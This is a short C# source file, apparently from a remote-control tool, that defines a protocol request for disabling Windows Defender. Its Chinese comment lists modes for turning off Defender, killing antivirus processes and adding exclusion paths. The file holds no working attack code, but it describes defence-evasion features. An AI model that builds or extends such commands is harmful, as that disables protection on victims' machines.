using System;

namespace RemoteControl.Protocals.Request
{
    public class RequestDisableDefender
    {
        /// <summary>
        /// 0=全部, 1=仅Defender, 2=仅杀软进程, 3=仅排除路径
        /// </summary>
        public int Mode { get; set; }
    }
}
